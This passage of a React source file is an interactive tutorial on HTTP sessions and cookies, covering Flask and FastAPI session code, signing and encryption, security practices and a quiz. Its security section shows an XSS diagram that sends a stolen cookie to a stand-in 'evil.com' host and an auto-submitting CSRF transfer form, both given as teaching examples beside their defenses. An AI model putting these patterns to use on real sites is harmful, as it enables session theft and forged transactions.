{`  Request URL                          Cookie Sent?
  ─────────────────────────────────────────────────────────────
  Set-Cookie domain=.example.com; Path=/; Secure; SameSite=Lax

  https://example.com/                  ✅ Yes (domain match)
  https://app.example.com/api           ✅ Yes (subdomain match)
  https://example.com/settings          ✅ Yes (path / matches all)
  http://example.com/                   ❌ No  (Secure → HTTPS only)
  https://evil.com/                     ❌ No  (different domain)
  https://example.com/ (from evil.com)  ✅ Yes (Lax: top-level GET ok)
  POST from evil.com to example.com     ❌ No  (Lax: blocks cross-site POST)`}
      </DiagramBox>

      <InfoBox title="Cookie Size Limits">
        <ul className="list-disc ml-4 space-y-1">
          <li><strong>Per cookie:</strong> ~4KB (4093 bytes typically) — name + value + attributes</li>
          <li><strong>Per domain:</strong> Most browsers allow 50-180 cookies per domain</li>
          <li><strong>Total Cookie header:</strong> Some servers limit the entire Cookie header to 8KB</li>
          <li>If you exceed limits, browsers silently drop the oldest cookies</li>
        </ul>
      </InfoBox>
    </div>
  );

  /* ══════════════════════════════════════════════════════
     SECTION 4 — FLASK SESSIONS
     ══════════════════════════════════════════════════════ */

  const renderFlask = () => (
    <div>
      <SectionTitle icon="🧪">Flask Sessions: Client-Side by Default</SectionTitle>
      <p className="text-sm text-slate-600 leading-relaxed mb-4">
        Flask uses <strong>client-side sessions</strong> by default. The entire session dictionary is <strong>serialized, compressed, timestamped, and signed</strong> (HMAC-SHA512) — then stored directly in the cookie. The data is <strong>signed but NOT encrypted</strong>: users can decode and read the session data, but they cannot tamper with it.
      </p>

      <SigningDiagram />

      <SectionTitle icon="⚙️">How Flask Signs Session Cookies</SectionTitle>

      <ExpandCard id="fl-lib" icon="📦" title="The itsdangerous Library" subtitle="Flask's session signing engine" color="#10b981">
        <p className="mb-2">Flask uses the <code className="bg-white px-1 rounded text-xs">itsdangerous</code> library (by the Pallets team, same as Flask). Specifically:</p>
        <ul className="list-disc ml-4 space-y-1">
          <li><strong>URLSafeTimedSerializer</strong> — serializes, timestamps, and signs data</li>
          <li><strong>Signing algorithm:</strong> HMAC-SHA512 using your app's <code className="bg-white px-1 rounded text-xs">SECRET_KEY</code></li>
          <li><strong>Serialization:</strong> JSON → zlib compress → base64url encode</li>
          <li><strong>Cookie format:</strong> <code className="bg-white px-1 rounded text-xs">payload.timestamp.signature</code></li>
        </ul>
      </ExpandCard>

      <CodeBlock title="Flask: Basic session usage">
{`from flask import Flask, session, redirect, request

app = Flask(__name__)
app.secret_key = "change-me-to-a-real-random-key"  # Used for HMAC signing

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    # ... validate credentials against DB ...

    # Store data in session (this gets signed into the cookie)
    session["user_id"] = 42
    session["role"] = "admin"
    session.permanent = True  # Sets Max-Age (default 31 days)

    return redirect("/dashboard")

@app.route("/dashboard")
def dashboard():
    if "user_id" not in session:
        return redirect("/login")

    # Flask automatically verified the HMAC signature before we get here
    user_id = session["user_id"]  # Read from the signed cookie
    return f"Welcome, user {user_id}!"

@app.route("/logout")
def logout():
    session.clear()  # Clears the cookie
    return redirect("/login")`}
      </CodeBlock>

      <InfoBox title="What the Cookie Actually Looks Like">
        <p className="mb-2">You can decode a Flask session cookie with base64 (it's not secret!):</p>
        <div className="font-mono bg-white bg-opacity-50 p-2 rounded text-xs overflow-x-auto">
          <p className="text-slate-400"># Cookie value from browser:</p>
          <p>eyJ1c2VyX2lkIjo0Miwicm9sZSI6ImFkbWluIn0.ZxN5QQ.r3Kj8xLm_qN7...</p>
          <p className="mt-2 text-slate-400"># Decoded (base64 → JSON):</p>
          <p>{"{"}"user_id": 42, "role": "admin"{"}"}</p>
          <p className="mt-2 text-slate-400"># The signature prevents tampering. Change one byte → HMAC fails → 403.</p>
        </div>
      </InfoBox>

      <SectionTitle icon="🔐">Flask: Server-Side Sessions (flask-session)</SectionTitle>
      <p className="text-sm text-slate-600 leading-relaxed mb-3">
        For sensitive data or large sessions, use <code className="bg-slate-100 px-1.5 py-0.5 rounded text-xs font-mono">flask-session</code> to store data on the server (Redis, Memcached, filesystem, or database). The cookie then contains only a random session ID.
      </p>

      <CodeBlock title="Flask: Server-side sessions with Redis">
{`from flask import Flask, session
from flask_session import Session
import redis

app = Flask(__name__)

# ── Session Configuration ──
app.config["SESSION_TYPE"] = "redis"
app.config["SESSION_REDIS"] = redis.from_url("redis://localhost:6379")
app.config["SESSION_PERMANENT"] = True
app.config["PERMANENT_SESSION_LIFETIME"] = 3600  # 1 hour
app.config["SESSION_KEY_PREFIX"] = "myapp:"
app.config["SESSION_USE_SIGNER"] = True  # Signs the session ID cookie
app.secret_key = "change-me-to-a-real-random-key"

Session(app)

# Usage is identical — session dict just stores to Redis now
@app.route("/login", methods=["POST"])
def login():
    session["user_id"] = 42  # Stored in Redis, not in the cookie
    return redirect("/dashboard")

# Redis key: "myapp:session:a3f8c9e1-4b2d-..." → {"user_id": 42, ...}`}
      </CodeBlock>

      <DiagramBox title="Flask Client-Side vs Server-Side Session Flow">
{`  CLIENT-SIDE (default Flask)              SERVER-SIDE (flask-session + Redis)
  ────────────────────────────              ───────────────────────────────────

  Browser ──► Flask                        Browser ──► Flask ──► Redis

  Cookie: eyJ1c2VyX2lkIjo0Mn0...           Cookie: session=a3f8c9e1...
  (entire session data, signed)             (just a random ID, signed)

  Flask verifies HMAC → reads data          Flask reads ID → queries Redis
  from cookie directly                      → gets {user_id: 42, ...}

  ✅ No external dependency                  ✅ Data invisible to user
  ⚠️ User can decode (base64) data          ✅ Can store large data
  ⚠️ 4KB limit                              ✅ Can revoke server-side
                                            ⚠️ Needs Redis/Memcached running`}
      </DiagramBox>
    </div>
  );

  /* ══════════════════════════════════════════════════════
     SECTION 5 — FASTAPI SESSIONS
     ══════════════════════════════════════════════════════ */

  const renderFastAPI = () => (
    <div>
      <SectionTitle icon="⚡">FastAPI Session Management</SectionTitle>
      <p className="text-sm text-slate-600 leading-relaxed mb-4">
        FastAPI has <strong>no built-in session system</strong>. You manage cookies directly using <code className="bg-slate-100 px-1.5 py-0.5 rounded text-xs font-mono">Response.set_cookie()</code> and choose your own signing/encryption strategy. The most common approach is to use <code className="bg-slate-100 px-1.5 py-0.5 rounded text-xs font-mono">itsdangerous</code> (same as Flask) or JWT-based session tokens.
      </p>

      <SectionTitle icon="🔏">Approach 1: Signed Cookies with itsdangerous</SectionTitle>

      <CodeBlock title="FastAPI: Signed cookie sessions (like Flask)">
{`from fastapi import FastAPI, Request, Response, HTTPException
from fastapi.responses import RedirectResponse
from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired
import json

app = FastAPI()
SECRET_KEY = "change-me-to-a-real-random-key"
serializer = URLSafeTimedSerializer(SECRET_KEY)
MAX_AGE = 3600  # 1 hour

def create_session_cookie(data: dict) -> str:
    """Serialize + sign session data → cookie value."""
    return serializer.dumps(data)

def read_session_cookie(cookie_value: str) -> dict | None:
    """Verify signature + deserialize → session data."""
    try:
        return serializer.loads(cookie_value, max_age=MAX_AGE)
    except (BadSignature, SignatureExpired):
        return None

@app.post("/login")
async def login(response: Response):
    # ... validate credentials ...
    session_data = {"user_id": 42, "role": "admin"}
    cookie_value = create_session_cookie(session_data)

    response = RedirectResponse("/dashboard", status_code=302)
    response.set_cookie(
        key="session",
        value=cookie_value,
        httponly=True,        # No JS access
        secure=True,          # HTTPS only
        samesite="lax",       # CSRF protection
        max_age=MAX_AGE,      # Expires in 1 hour
        path="/",
    )
    return response

@app.get("/dashboard")
async def dashboard(request: Request):
    cookie = request.cookies.get("session")
    if not cookie:
        raise HTTPException(status_code=401, detail="Not authenticated")

    session = read_session_cookie(cookie)
    if not session:
        raise HTTPException(status_code=401, detail="Invalid or expired session")

    return {"message": f"Welcome user {session['user_id']}!"}

@app.post("/logout")
async def logout():
    response = RedirectResponse("/login", status_code=302)
    response.delete_cookie("session", path="/")
    return response`}
      </CodeBlock>

      <SectionTitle icon="🗄️">Approach 2: Server-Side Sessions with Redis</SectionTitle>

      <CodeBlock title="FastAPI: Server-side sessions with Redis">
{`from fastapi import FastAPI, Request, Response, HTTPException, Depends
from fastapi.responses import RedirectResponse
import redis.asyncio as redis
import secrets, json

app = FastAPI()
redis_client = redis.from_url("redis://localhost:6379", decode_responses=True)
SESSION_TTL = 3600  # 1 hour

async def create_session(data: dict) -> str:
    """Create a new server-side session, return the session ID."""
    session_id = secrets.token_urlsafe(32)  # Cryptographically random
    await redis_client.setex(
        f"session:{session_id}",
        SESSION_TTL,
        json.dumps(data),
    )
    return session_id

async def get_session(request: Request) -> dict:
    """Dependency: read and validate the session from cookie → Redis."""
    session_id = request.cookies.get("session_id")
    if not session_id:
        raise HTTPException(status_code=401, detail="No session")

    data = await redis_client.get(f"session:{session_id}")
    if not data:
        raise HTTPException(status_code=401, detail="Session expired")

    # Refresh TTL on each request (sliding expiration)
    await redis_client.expire(f"session:{session_id}", SESSION_TTL)
    return json.loads(data)

@app.post("/login")
async def login():
    # ... validate credentials ...
    session_id = await create_session({"user_id": 42, "role": "admin"})

    response = RedirectResponse("/dashboard", status_code=302)
    response.set_cookie(
        key="session_id",
        value=session_id,
        httponly=True,
        secure=True,
        samesite="lax",
        max_age=SESSION_TTL,
        path="/",
    )
    return response

@app.get("/dashboard")
async def dashboard(session: dict = Depends(get_session)):
    return {"message": f"Welcome user {session['user_id']}!"}

@app.post("/logout")
async def logout(request: Request):
    session_id = request.cookies.get("session_id")
    if session_id:
        await redis_client.delete(f"session:{session_id}")

    response = RedirectResponse("/login", status_code=302)
    response.delete_cookie("session_id", path="/")
    return response`}
      </CodeBlock>

      <SectionTitle icon="🔒">Approach 3: Encrypted Cookies (Fernet)</SectionTitle>
      <p className="text-sm text-slate-600 leading-relaxed mb-3">
        If you need to hide session data from the user entirely (not just sign it), use <strong>Fernet symmetric encryption</strong> from the <code className="bg-slate-100 px-1.5 py-0.5 rounded text-xs font-mono">cryptography</code> library. This provides both confidentiality and authenticity.
      </p>

      <CodeBlock title="FastAPI: Encrypted session cookie with Fernet">
{`from cryptography.fernet import Fernet, InvalidToken
import json, base64

# Generate once: Fernet.generate_key() → store in env var
FERNET_KEY = b"your-32-byte-base64-encoded-key-here="
fernet = Fernet(FERNET_KEY)

def encrypt_session(data: dict) -> str:
    """Encrypt session data → URL-safe cookie value."""
    plaintext = json.dumps(data).encode()
    return fernet.encrypt(plaintext).decode()  # includes timestamp + HMAC

def decrypt_session(cookie_value: str, max_age: int = 3600) -> dict | None:
    """Decrypt + verify cookie → session data."""
    try:
        plaintext = fernet.decrypt(cookie_value.encode(), ttl=max_age)
        return json.loads(plaintext)
    except (InvalidToken, json.JSONDecodeError):
        return None

# Usage:
# cookie_value = encrypt_session({"user_id": 42})
# → "gAAAAABn..." (opaque, encrypted — user CANNOT see the data)
# session = decrypt_session(cookie_value)
# → {"user_id": 42} (or None if tampered/expired)`}
      </CodeBlock>

      <DiagramBox title="Signing vs Encryption Comparison">
{`  SIGNED (itsdangerous / Flask default)
  ─────────────────────────────────────
  Cookie: eyJ1c2VyX2lkIjo0Mn0.timestamp.HMAC_signature
          ^^^^^^^^^^^^^^^^^^^^^^^^
          User CAN decode this (base64 → JSON)
          User CANNOT modify it (HMAC verification fails)

  → Use when: session data is not sensitive (user_id, role)
  → Library: itsdangerous


  ENCRYPTED (Fernet / AES)
  ────────────────────────
  Cookie: gAAAAABnRtNxK8qL2m...opaque_bytes...
          ^^^^^^^^^^^^^^^^^^^^^^^^
          User CANNOT read the data (AES-128-CBC encrypted)
          User CANNOT modify it (HMAC verification fails)

  → Use when: session data IS sensitive (email, internal IDs)
  → Library: cryptography (Fernet)


  Note: Both provide INTEGRITY (tamper detection).
        Only encryption provides CONFIDENTIALITY (data hiding).`}
      </DiagramBox>
    </div>
  );

  /* ══════════════════════════════════════════════════════
     SECTION 6 — SECURITY
     ══════════════════════════════════════════════════════ */

  const renderSecurity = () => (
    <div>
      <SectionTitle icon="🛡️">Session Security Best Practices</SectionTitle>

      <Warning title="Sessions Are a Prime Attack Target">
        Stealing a session cookie = stealing the user's identity. Unlike passwords, session cookies are sent with every request, making them a high-value target. XSS, CSRF, network sniffing, and session fixation are the main attack vectors.
      </Warning>

      <ExpandCard id="sec-xss" icon="💉" title="Cross-Site Scripting (XSS) → Cookie Theft" subtitle="Attacker injects JS that steals document.cookie" color="#ef4444">
        <DiagramBox title="XSS Cookie Theft Attack">
{`  Attacker                     Victim Browser               Your Server
     │                              │                            │
     │── Injects malicious JS ─────►│                            │
     │   (stored in forum post,     │                            │
     │    URL param, etc.)          │                            │
     │                              │                            │
     │                              │── JS runs: ──────────────► │
     │                              │   document.cookie           │
     │                              │   = "session=abc123"        │
     │                              │                            │
     │◄── fetch('evil.com/steal?    │                            │
     │    cookie=abc123')           │                            │
     │                              │                            │
     │── Uses stolen cookie ────────┼───────────────────────────►│
     │   to impersonate victim      │                            │`}
        </DiagramBox>
        <div className="mt-3">
          <p className="font-bold text-xs text-green-700 mb-1">Defense: HttpOnly flag</p>
          <p className="text-xs">Set <code className="bg-white px-1 rounded">HttpOnly</code> on all session cookies. This prevents JavaScript from accessing <code className="bg-white px-1 rounded">document.cookie</code> — the cookie still gets sent with requests, but JS literally cannot read it.</p>
        </div>
      </ExpandCard>

      <ExpandCard id="sec-csrf" icon="🎭" title="Cross-Site Request Forgery (CSRF)" subtitle="Attacker tricks user's browser into making authenticated requests" color="#f59e0b">
        <DiagramBox title="CSRF Attack Flow">
{`  Victim visits evil.com while logged into bank.com

  evil.com HTML:
  <form action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker_account" />
    <input name="amount" value="10000" />
  </form>
  <script>document.forms[0].submit();</script>

  Browser sends:
  POST /transfer HTTP/1.1
  Host: bank.com
  Cookie: session=victim_session_cookie     ← auto-attached!

  to=attacker_account&amount=10000

  bank.com sees a valid session → processes the transfer!`}
        </DiagramBox>
        <div className="mt-3">
          <p className="font-bold text-xs text-green-700 mb-1">Defenses:</p>
          <ul className="list-disc ml-4 space-y-1 text-xs">
            <li><strong>SameSite=Lax</strong> (minimum) or <strong>SameSite=Strict</strong> — browser won't send cookie on cross-site POST</li>
            <li><strong>CSRF tokens</strong> — unique per-form token validated server-side</li>
            <li><strong>Double-submit cookie</strong> pattern — send CSRF token in both cookie and header</li>
          </ul>
        </div>
      </ExpandCard>

      <ExpandCard id="sec-fixation" icon="📌" title="Session Fixation" subtitle="Attacker forces a known session ID onto the victim" color="#8b5cf6">
        <p className="mb-2">The attacker creates a session, then tricks the victim into using that session ID. After the victim logs in, the attacker already has the session ID.</p>
        <p className="font-bold text-xs text-green-700 mb-1">Defense: Regenerate session ID after login</p>
        <CodeBlock title="Flask: Regenerate session on login">
{`@app.route("/login", methods=["POST"])
def login():
    # ... validate credentials ...
    session.clear()          # Destroy old session
    session["user_id"] = 42  # New session with new ID
    # Flask automatically generates a new signed cookie`}
        </CodeBlock>
      </ExpandCard>

      <ExpandCard id="sec-sniff" icon="📡" title="Network Sniffing (Man-in-the-Middle)" subtitle="Attacker intercepts cookie on unencrypted connection" color="#ec4899">
        <p className="mb-2">If a cookie is sent over plain HTTP, anyone on the same network (WiFi, corporate proxy) can read it.</p>
        <p className="font-bold text-xs text-green-700 mb-1">Defense: Secure flag + HSTS</p>
        <ul className="list-disc ml-4 space-y-1 text-xs">
          <li><strong>Secure flag:</strong> Cookie is only sent over HTTPS</li>
          <li><strong>HSTS header:</strong> Forces the browser to always use HTTPS, even if user types http://</li>
          <li><code className="bg-white px-1 rounded">Strict-Transport-Security: max-age=31536000; includeSubDomains</code></li>
        </ul>
      </ExpandCard>

      <SectionTitle icon="✅">Session Security Checklist</SectionTitle>
      <div className="bg-slate-50 border-2 border-slate-200 rounded-xl p-5">
        <div className="space-y-2">
          {[
            ["HttpOnly", "Always set HttpOnly on session cookies", true],
            ["Secure", "Always set Secure flag (HTTPS only)", true],
            ["SameSite", "Set SameSite=Lax at minimum (Strict if possible)", true],
            ["HTTPS", "Serve your entire app over HTTPS", true],
            ["HSTS", "Enable Strict-Transport-Security header", true],
            ["SECRET_KEY", "Use a long, random SECRET_KEY (32+ bytes from os.urandom)", true],
            ["Rotation", "Rotate SECRET_KEY periodically (invalidates all sessions)", false],
            ["Regenerate", "Regenerate session ID after login (prevents fixation)", true],
            ["Expiry", "Set reasonable Max-Age (1-24 hours for sensitive apps)", true],
            ["Logout", "Clear session on both client (delete cookie) and server (Redis delete)", true],
            ["CSP", "Content-Security-Policy header to reduce XSS risk", false],
            ["CSRF", "Use CSRF tokens for state-changing POST/PUT/DELETE endpoints", true],
          ].map(([label, desc, critical], i) => (
            <div key={i} className="flex items-start gap-3">
              <span className={`flex-shrink-0 text-xs font-bold px-2 py-0.5 rounded-full ${critical ? "bg-red-100 text-red-700" : "bg-amber-100 text-amber-700"}`}>
                {critical ? "MUST" : "SHOULD"}
              </span>
              <div>
                <span className="font-bold text-sm text-slate-800">{label}</span>
                <span className="text-sm text-slate-600"> — {desc}</span>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );

  /* ══════════════════════════════════════════════════════
     SECTION 7 — QUIZ
     ══════════════════════════════════════════════════════ */

  const quiz = [
    { q: "What makes HTTP stateless?", opts: ["It uses TCP", "Each request is independent with no memory of previous ones", "It requires cookies", "It uses TLS"], c: 1 },
    { q: "Which cookie attribute prevents JavaScript from reading the cookie?", opts: ["Secure", "SameSite", "HttpOnly", "Path"], c: 2 },
    { q: "What does Flask use to sign session cookies?", opts: ["JWT", "AES encryption", "itsdangerous (HMAC-SHA512)", "bcrypt"], c: 2 },
    { q: "What is the difference between a signed and encrypted cookie?", opts: ["Signed is faster", "Signed prevents tampering; encrypted also hides data", "Encrypted is signed too but uses RSA", "There is no difference"], c: 1 },
    { q: "Where does a session cookie (no Expires/Max-Age) live in the browser?", opts: ["LocalStorage", "SQLite on disk", "Process memory (RAM)", "IndexedDB"], c: 2 },
    { q: "What SameSite value blocks cross-site POST requests but allows top-level GET navigation?", opts: ["None", "Strict", "Lax", "Secure"], c: 2 },
    { q: "How does a CSRF attack exploit session cookies?", opts: ["Steals the cookie via XSS", "Tricks the browser into sending authenticated requests to another site", "Decrypts the session on the server", "Replays old session IDs"], c: 1 },
    { q: "What should you do with the session ID after a user logs in?", opts: ["Nothing", "Regenerate it to prevent session fixation", "Delete it", "Send it in the URL"], c: 1 },
    { q: "What does FastAPI use for built-in session management?", opts: ["flask-session", "JWT middleware", "Nothing — you must implement it yourself", "Django sessions"], c: 2 },
    { q: "What Python library provides Fernet (AES) encryption for cookies?", opts: ["itsdangerous", "hashlib", "cryptography", "pycrypto"], c: 2 },
  ];

  const renderQuiz = () => {
    const total = quiz.length;
    const answered = Object.keys(quizAns).length;
    const correct = showRes ? quiz.filter((q, i) => quizAns[i] === q.c).length : 0;

    return (
      <div>
        <SectionTitle icon="🧠">Knowledge Check</SectionTitle>
        <p className="text-sm text-slate-600 leading-relaxed mb-4">
          Test your understanding of sessions, cookies, and security.
        </p>

        {showRes && (
          <div className={`rounded-xl p-4 mb-6 border-2 text-center ${correct >= 8 ? "bg-green-50 border-green-300" : correct >= 5 ? "bg-amber-50 border-amber-300" : "bg-red-50 border-red-300"}`}>
            <div className="text-3xl mb-2">{correct >= 8 ? "🏆" : correct >= 5 ? "👍" : "📚"}</div>
            <div className="font-bold text-lg">{correct} / {total}</div>
            <div className="text-sm text-slate-600 mt-1">
              {correct >= 8 ? "Excellent! You know session security well!" : correct >= 5 ? "Good job! Review the sections you missed." : "Keep studying — re-read the guide above."}
            </div>
          </div>
        )}

        {quiz.map((q, qi) => (
          <div key={qi} className="mb-5 bg-gray-50 border rounded-xl p-4">
            <p className="font-bold text-sm mb-3">{qi + 1}. {q.q}</p>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
              {q.opts.map((o, oi) => {
                const sel = quizAns[qi] === oi;
                const ok = showRes && oi === q.c;
                const bad = showRes && sel && oi !== q.c;
                return (
                  <button
                    key={oi}
                    onClick={() => !showRes && setQuizAns((p) => ({ ...p, [qi]: oi }))}
                    className={`text-left text-sm p-3 rounded-lg border-2 transition-all ${
                      ok ? "bg-green-100 border-green-500 font-bold" :
                      bad ? "bg-red-100 border-red-400" :
                      sel ? "bg-blue-100 border-blue-400" :
                      "bg-white border-gray-200 hover:border-blue-300"
                    }`}
                  >
                    {o}
                  </button>
                );
              })}
            </div>
          </div>
        ))}

        <div className="flex gap-3 mt-4">
          <button
            onClick={() => setShowRes(true)}
            disabled={answered < total}
            className={`px-6 py-2.5 rounded-lg font-bold text-sm transition-all ${
              answered < total
                ? "bg-gray-200 text-gray-400 cursor-not-allowed"
                : "bg-indigo-600 text-white hover:bg-indigo-700 shadow-md"
            }`}
          >
            Check Answers ({answered}/{total})
          </button>
          {showRes && (
            <button
              onClick={() => { setQuizAns({}); setShowRes(false); }}
              className="px-6 py-2.5 rounded-lg font-bold text-sm bg-gray-100 text-gray-700 hover:bg-gray-200 transition-all"
            >
              Reset Quiz
            </button>
          )}
        </div>
      </div>
    );
  };

  /* ── render switch ─────────────────────────────────── */

  const renderContent = () => {
    switch (active) {
      case "overview": return renderOverview();
      case "lifecycle": return renderLifecycle();
      case "persistence": return renderPersistence();
      case "flask": return renderFlask();
      case "fastapi": return renderFastAPI();
      case "security": return renderSecurity();
      case "quiz": return renderQuiz();
      default: return null;
    }
  };

  /* ══════════════════════════════════════════════════════
     MAIN RENDER
     ══════════════════════════════════════════════════════ */

  return (
    <div style={{ maxWidth: 900, margin: "0 auto", padding: "24px 16px" }}>
      {/* Header */}
      <div style={{ marginBottom: 24 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 8 }}>
          <span style={{ fontSize: 32 }}>🍪</span>
          <div>
            <h1 style={{ fontSize: 22, fontWeight: 800, color: "#0f172a", margin: 0 }}>Sessions & Cookies</h1>
            <p style={{ fontSize: 13, color: "#64748b", margin: 0 }}>How HTTP State Works — Storage, Signing, Encryption & Security</p>
          </div>
        </div>
      </div>

      {/* Tab Navigation */}
      <div style={{ display: "flex", gap: 5, marginBottom: 20, overflowX: "auto", paddingBottom: 4 }}>
        {sections.map((s) => (
          <button
            key={s.id}
            onClick={() => { setActive(s.id); setExpanded(null); }}
            style={{
              padding: "7px 12px",
              borderRadius: 8,
              border: "none",
              background: active === s.id ? s.color : "#fff",
              color: active === s.id ? "#fff" : "#475569",
              fontSize: 11,
              fontWeight: 600,
              cursor: "pointer",
              whiteSpace: "nowrap",
              boxShadow: active === s.id ? `0 2px 8px ${s.color}40` : "0 1px 2px rgba(0,0,0,0.06)",
              display: "flex",
              alignItems: "center",
              gap: 4,
              transition: "all 0.15s",
            }}
          >
            <span style={{ fontSize: 13 }}>{s.icon}</span> {s.title}
          </button>
        ))}
      </div>

      {/* Section Content */}
      <div style={{ background: "#fff", border: "1px solid #e2e8f0", borderRadius: 12, padding: 24 }}>
        {renderContent()}
      </div>
    </div>
  );
}
